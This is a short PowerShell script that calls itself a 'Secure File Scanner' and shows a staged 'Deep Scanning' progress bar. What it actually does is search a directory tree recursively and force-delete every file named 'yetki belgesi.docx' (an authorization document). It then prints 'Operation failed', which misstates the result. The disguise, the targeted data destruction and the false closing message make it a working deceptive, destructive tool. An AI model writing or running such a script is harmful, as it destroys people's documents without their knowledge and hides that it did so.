param(
    [Parameter(Mandatory=$true)]
    [string]$RootPath
)

if (-not (Test-Path $RootPath)) {
    Write-Error "Target path not found: $RootPath"
    exit
}

Clear-Host
Write-Host "Initializing Secure File Scanner..." -ForegroundColor Cyan
Start-Sleep -Milliseconds 800

# Dosyaları al
$allFiles = Get-ChildItem -Path $RootPath -Recurse -File -ErrorAction SilentlyContinue
$total = $allFiles.Count
$current = 0

$targets = @()

foreach ($file in $allFiles) {
    $current++
    $percent = [int](($current / $total) * 100)

    Write-Progress -Activity "Deep Scanning Directories..." `
                   -Status "Analyzing: $($file.Name)" `
                   -PercentComplete $percent

    Start-Sleep -Milliseconds 10

    if ($file.Name -ieq "yetki belgesi.docx") {
        $targets += $file
    }
}

Write-Progress -Activity "Deep Scanning Directories..." -Completed
Start-Sleep -Milliseconds 500

if ($targets.Count -eq 0) {
    Write-Host "No target files found." -ForegroundColor Yellow
    exit
}

Write-Host ""
Write-Host "Target file(s) detected:" -ForegroundColor Red
$targets | ForEach-Object { Write-Host $_.FullName }

Start-Sleep -Seconds 1

foreach ($t in $targets) {
    try {
        Remove-Item $t.FullName -Force
        Write-Host "[DELETED] $($t.FullName)" -ForegroundColor Green
    }
    catch {
        Write-Host "[FAILED]  $($t.FullName)" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "Operation failed" -ForegroundColor Cyan
